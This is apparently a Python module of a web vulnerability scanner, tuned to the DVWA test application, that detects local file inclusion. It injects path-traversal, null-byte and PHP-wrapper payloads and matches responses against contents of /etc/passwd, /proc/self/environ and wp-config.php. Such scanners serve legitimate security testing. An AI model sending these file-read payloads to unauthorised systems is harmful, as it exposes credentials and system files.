"""
LFI 检测模块
检测：路径遍历 / /proc/self/environ / PHP wrappers
验证：必须包含文件特征内容才报告（不报告无内容空响应）
"""
import logging
import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlparse

from ..base import DetectionModule, ModuleInfo, register_module
from ...models import Vulnerability, VulnerabilityType, Severity, Confidence, ScanTarget
from ...core.session import HTTPPool
from .payloads import (
    LFI_PAYLOADS_LINUX,
    LFI_PAYLOADS_WINDOWS,
    NULL_BYTE_PAYLOADS,
    PHP_WRAPPER_PAYLOADS,
    build_path_traversal_payloads,
)


logger = logging.getLogger("wvs.module.lfi")


# 读取文件必须包含这些特征，才算真的读到了内容
FILE_CONTENT_MARKERS = {
    # Linux
    "/etc/passwd": ["root:", "nobody", "daemon:"],
    "/etc/hosts": ["localhost", "127.0.0.1"],
    "/etc/issue": ["Ubuntu", "Debian", "CentOS"],
    "/etc/motd": ["Linux", "Welcome"],
    "/etc/group": ["root:", "wheel:", "sudo:"],
    # /proc/self/
    "/proc/self/environ": ["PATH=", "HOME=", "USER=", "SHELL="],
    "/proc/self/cmdline": ["php", "apache", "nginx", "python"],
    "/proc/self/status": ["Name:", "Pid:", "Uid:"],
    # nginx/apache config
    "/var/log/apache2/access.log": ["HTTP/", "GET ", "POST "],
    "/var/log/apache2/error.log": ["error", "Notice"],
    "/var/www/html/config.php": ["<?php", "<?=", "mysql", "DB_"],
    "/var/www/html/wp-config.php": ["DB_NAME", "DB_USER", "DB_PASSWORD"],
    # Windows
    "C:\\Windows\\win.ini": ["[fonts]", "[extensions]", "[files]", "[Mail]"],
    "C:\\boot.ini": ["boot loader", "default="],
}

# 通用的读文件成功标志（fallback）
GENERIC_FILE_MARKERS = [
    "root:", "nobody:", "daemon:",  # Unix
    "[fonts]", "[extensions]",  # Windows ini
    "<?php", "<?=", "<%", "%>",  # PHP
    "mysql", "pgsql", "DB_",  # DB config
    "HOME=", "PATH=", "USER=", "SHELL=",  # /proc
    "HTTP/", "GET ", "POST ",  # Log
]


@register_module
class LFIDetector(DetectionModule):

    @classmethod
    def get_info(cls) -> ModuleInfo:
        return ModuleInfo(
            name="lfi",
            description="检测本地文件包含漏洞（LFI / /proc/ / PHP wrappers）",
            author="WVS Team",
            version="1.0.0",
            enabled_by_default=True,
            tags=["lfi", "local-file-inclusion", "file-read", "rfi"],
        )

    def __init__(self, config=None, session: Optional[HTTPPool] = None):
        super().__init__(config)
        self.session = session
        self._found_vulns: List[Vulnerability] = []
        self._checked_urls: set = set()

    async def _scan_impl(self, target: ScanTarget) -> List[Vulnerability]:
        self._found_vulns = []

        # ── 1. 优先使用 target.params（来自 scanner/crawler，已带 auth）──
        target_params = getattr(target, 'params', None) or {}
        target_data = getattr(target, 'data', None) or {}
        if target_params:
            ep_params = target_params.copy()
            logger.debug(f"[LFI] 使用 target.params={list(ep_params.keys())} 检测 {target.url}")
            await self._scan_endpoint(target.url, ep_params, "GET", "query")
        elif target_data:
            ep_params = target_data.copy()
            logger.debug(f"[LFI] 使用 target.data={list(ep_params.keys())} 检测 {target.url}")
            await self._scan_endpoint(target.url, ep_params, "POST", "body")

        # ── 2. 补充：用 _extract_endpoints 获取更多端点 ──
        endpoints = self._extract_endpoints(target)
        logger.info(f"[LFI] 开始检测，共 {len(endpoints)} 个端点")

        for endpoint in endpoints:
            url = endpoint["url"]
            params = endpoint.get("params", {})
            method = endpoint.get("method", "GET")
            param_type = endpoint.get("param_type", "query")

            if url in self._checked_urls:
                continue
            self._checked_urls.add(url)

            try:
                await self._scan_endpoint(url, params, method, param_type)
            except Exception as e:
                logger.debug(f"[LFI] 检测 {url} 时出错: {e}")

        logger.info(f"[LFI] 检测完成，发现 {len(self._found_vulns)} 个漏洞")
        return self._found_vulns

    async def _scan_endpoint(
        self,
        url: str,
        params: Dict[str, str],
        method: str,
        param_type: str,
    ) -> None:
        if not params:
            return

        await self._scan_endpoint_method(url, params, method, param_type)

    async def _scan_endpoint_method(
        self,
        url: str,
        params: Dict[str, str],
        method: str,
        param_type: str,
    ) -> bool:
        """单次检测（GET 或 POST），返回是否发现漏洞"""
        if not params:
            return False

        # 获取 baseline
        baseline = await self._send_request(method, url, params, param_type)
        if baseline is None:
            return False

        baseline_text = baseline.get("text", "")[:10000]

        # 检测每个参数
        for param_name in params.keys():
            found = await self._test_lfi(
                url, params, param_name, method, param_type, baseline_text
            )
            if found:
                # 每个端点只报告一个 LFI（避免同一参数报多条）
                logger.warning(f"[LFI] 检测到: {url} [{param_name}]")
                return True
        
        return False

    async def _test_lfi(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        param_type: str,
        baseline_text: str,
    ) -> bool:
        """
        LFI 检测：注入路径遍历，观察是否读到文件内容

        Returns:
            True = 发现 LFI 漏洞
        """
        logger.debug(f"[LFI] 开始检测: {url} [{param_name}]")

        # P17: 非文件包含端点跳过 LFI 检测
        # DVWA 只有 /vulnerabilities/fi/ 存在文件包含漏洞
        # xss_/sqli/brute/exec/csrf/csp/upload/javascript 均无文件包含能力
        non_fi_patterns = [
            "/xss_", "/csrf", "/sqli", "/sqli_blind", "/brute",
            "/exec", "/csp", "/javascript", "/upload", "/captcha"
        ]
        if any(pattern in url for pattern in non_fi_patterns):
            logger.debug(f"[LFI] 跳过非 FI 端点: {url}")
            return False

        confirmed_payload = None
        confirmed_file = None
        confirmed_content = None

        # 第一轮：DVWA 特有的文件路径（如果使用 file 参数）
        # DVWA FI 页面默认包含 include.php，直接用相对路径即可
        dvwa_payloads = [
            "include.php",
            "file1.php",
            "file2.php",
            "file3.php",
            "file4.php",
            "file5.php",
            "file6.php",
            "file7.php",
        ]

        for payload in dvwa_payloads[:3]:
            test_params = params.copy()
            test_params[param_name] = payload
            logger.debug(f"[LFI] 测试 DVWA payload: {payload}")

            resp = await self._send_request(method, url, test_params, param_type)
            if resp is None:
                continue

            resp_text = resp.get("text", "")
            logger.debug(f"[LFI] 响应长度: {len(resp_text)}")

            # DVWA 的特征：包含 PHP 文件内容
            if "include" in resp_text.lower() or "<?php" in resp_text or "DVWA" in resp_text:
                # 这不是真正的 LFI，只是正常的文件包含
                # 继续测试其他 payload
                pass

        # 第二轮：标准 payloads (Linux + Windows)
        test_payloads = LFI_PAYLOADS_LINUX[:8]
        test_payloads.extend(LFI_PAYLOADS_WINDOWS[:3])
        test_payloads.extend(build_path_traversal_payloads(3)[:8])

        for payload, file_info in self._iter_lfi_payloads(test_payloads):
            test_params = params.copy()
            test_params[param_name] = payload
            logger.debug(f"[LFI] 测试 payload: {payload}")

            resp = await self._send_request(method, url, test_params, param_type)
            if resp is None:
                continue

            resp_text = resp.get("text", "")

            # 检测是否读到了文件内容（关键：必须有特征字符串）
            matched_file, matched_content = self._check_file_content(
                resp_text, payload, baseline_text, url
            )

            if matched_file and matched_content:
                logger.info(f"[LFI] 发现文件读取: {url} [{param_name}] file={matched_file}")
                confirmed_payload = payload
                confirmed_file = matched_file
                confirmed_content = matched_content

                # 二次验证
                if await self._verify_lfi(
                    url, params, param_name, method, param_type, payload
                ):
                    vuln = self._create_vuln(
                        url=url,
                        param=param_name,
                        param_type=param_type,
                        method=method,
                        payload=payload,
                        file_path=matched_file,
                        evidence=matched_content[:200],
                    )
                    self._found_vulns.append(vuln)
                    return True

        # 第二轮：Null byte payloads（绕过 .php 后缀）
        for payload in NULL_BYTE_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload

            resp = await self._send_request(method, url, test_params, param_type)
            if resp is None:
                continue

            resp_text = resp.get("text", "")
            matched_file, matched_content = self._check_file_content(
                resp_text, payload, baseline_text, url
            )
            if matched_file and matched_content:
                if await self._verify_lfi(url, params, param_name, method, param_type, payload):
                    vuln = self._create_vuln(
                        url=url,
                        param=param_name,
                        param_type=param_type,
                        method=method,
                        payload=payload,
                        file_path=matched_file,
                        evidence=matched_content[:200],
                    )
                    self._found_vulns.append(vuln)
                    return True

        # 第三轮：PHP wrappers（需响应包含 baseline 中没有的文件内容才报）
        for payload in PHP_WRAPPER_PAYLOADS[:3]:
            test_params = params.copy()
            test_params[param_name] = payload

            resp = await self._send_request(method, url, test_params, param_type)
            if resp is None:
                continue

            resp_text = resp.get("text", "")
            
            # P16: PHP wrapper 检测必须返回 baseline 中没有的文件内容
            # DVWA 等 PHP 应用页面本身就含 <?php / mysql 等标记，纯标记匹配误报极高
            if baseline_text:
                # 找出只在 resp_text 中出现、不在 baseline 中的 marker
                new_markers = [m for m in GENERIC_FILE_MARKERS 
                              if m in resp_text and m not in baseline_text]
                if not new_markers:
                    logger.debug(f"[LFI] PHP wrapper dismissed (no new content): {url} [{param_name}]")
                    continue
                
                # 额外验证：响应长度要有显著变化（至少 15%）
                len_ratio = len(resp_text) / max(len(baseline_text), 1)
                if 0.85 < len_ratio < 1.15:
                    logger.debug(f"[LFI] PHP wrapper dismissed (same length): {url} [{param_name}]")
                    continue
                
                evidence = f"PHP wrapper returned new content: {', '.join(new_markers[:3])}"
            else:
                evidence = "PHP wrapper payload accepted"
            
            vuln = self._create_vuln(
                url=url,
                param=param_name,
                param_type=param_type,
                method=method,
                payload=payload,
                file_path=payload[:50],
                evidence=evidence,
            )
            self._found_vulns.append(vuln)
            return True

        return False

    def _iter_lfi_payloads(self, payloads: list):
        """迭代 payloads，yield (payload, target_file)"""
        for payload in payloads:
            file_path = self._extract_file_from_payload(payload)
            yield payload, file_path

    def _extract_file_from_payload(self, payload: str) -> str:
        """从 payload 中提取目标文件路径"""
        # 清理 null byte
        path = payload.replace("%00", "")
        if path.startswith("/"):
            return path
        if "etc/passwd" in payload:
            return "/etc/passwd"
        if "win.ini" in payload:
            return "C:\\Windows\\win.ini"
        if "proc/" in payload:
            for marker in ["/proc/self/environ", "/proc/self/cmdline", "/proc/self/status"]:
                if marker in payload:
                    return marker
        return payload

    def _check_file_content(
        self, resp_text: str, payload: str, baseline_text: str, url: str = ""
    ) -> Tuple[Optional[str], Optional[str]]:
        """
        检测响应中是否包含文件内容

        Returns:
            (file_path, matched_content) = 读到文件了
            (None, None) = 没读到有效内容
        """
        logger.debug(f"[LFI] 检测文件内容: payload={payload[:30]}")

        # 1. 必须排除 baseline 中就有的内容（避免页面本身就包含这些词）
        for marker in GENERIC_FILE_MARKERS:
            if marker in resp_text and marker not in baseline_text:
                # 进一步确认：不是页面报错，而是文件内容
                # 文件内容的特征：多行、有格式
                lines = resp_text.split("\n")
                matched_lines = [l for l in lines if marker in l]
                if matched_lines:
                    # 确认不在 baseline 中
                    baseline_lines = [l for l in baseline_text.split("\n") if marker in l]
                    if len(matched_lines) > len(baseline_lines):
                        file_path = self._extract_file_from_payload(payload)
                        logger.debug(f"[LFI] 发现文件内容特征: {marker} in {file_path}")
                        return file_path, "\n".join(matched_lines[:3])

        # 2. 检测 PHP 文件包含特征（P17: 必须行数 > baseline）
        dvwa_markers = [
            "include(",
            "require(",
            "file_get_contents",
            "fopen(",
        ]
        for marker in dvwa_markers:
            if marker in resp_text and marker not in baseline_text:
                # P17: 和 Check 1 同款行数比对，防止页面 HTML 回显误判
                lines = resp_text.split("\n")
                matched_lines = [l for l in lines if marker in l]
                baseline_lines = [l for l in baseline_text.split("\n") if marker in l]
                if len(matched_lines) > len(baseline_lines):
                    logger.debug(f"[LFI] 发现 PHP 包含特征: {marker}")
                    file_path = self._extract_file_from_payload(payload)
                    return file_path, "\n".join(matched_lines[:3])

        # 3. DVWA 文件包含页面的 include.php 检测（仅限 /fi/ 页面）
        if "include.php" in payload and "/fi" in url:
            if "DVWA" in resp_text and len(resp_text) > len(baseline_text) + 100:
                logger.debug(f"[LFI] 发现 DVWA 页面内容变化")
                return payload, resp_text[:200]

        return None, None

    async def _verify_lfi(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        param_type: str,
        original_payload: str,
    ) -> bool:
        """二次验证：用不同的文件路径确认"""
        verify_files = ["/etc/hosts", "/etc/issue"]
        if original_payload.startswith("../../.."):
            # 路径遍历：换不同的遍历深度
            verify_payloads = [
                "../../../etc/hosts",
                "../../etc/passwd",
            ]
        else:
            verify_payloads = verify_files

        for verify_payload in verify_payloads:
            test_params = params.copy()
            test_params[param_name] = verify_payload

            resp = await self._send_request(method, url, test_params, param_type)
            if resp is None:
                continue

            resp_text = resp.get("text", "")

            # 验证读到了 /etc/hosts 的内容
            if "etc/hosts" in verify_payload or "hosts" in verify_payload:
                if "localhost" in resp_text or "127.0.0.1" in resp_text:
                    if "localhost" not in params.get(param_name, ""):
                        return True

        return False

    # 注：_send_request 和 _extract_endpoints 方法已移至基类 DetectionModule

    def _create_vuln(
        self,
        url: str,
        param: str,
        param_type: str,
        method: str,
        payload: str,
        file_path: str,
        evidence: str,
    ) -> Vulnerability:
        return Vulnerability(
            type=VulnerabilityType.LFI,
            title="Local File Inclusion / File Read",
            url=url,
            method=method,
            parameter=param,
            parameter_type=param_type,
            payload=payload,
            evidence=evidence,
            severity=Severity.MEDIUM,
            confidence=Confidence.HIGH,
            description=f"发现本地文件包含漏洞，可读取任意文件：{file_path}",
            recommendation="避免动态包含用户输入的文件，使用白名单或预定义文件列表",
            module="lfi",
            tags=["lfi", "file-inclusion", "file-read"],
            context={"file_path": file_path},
        )
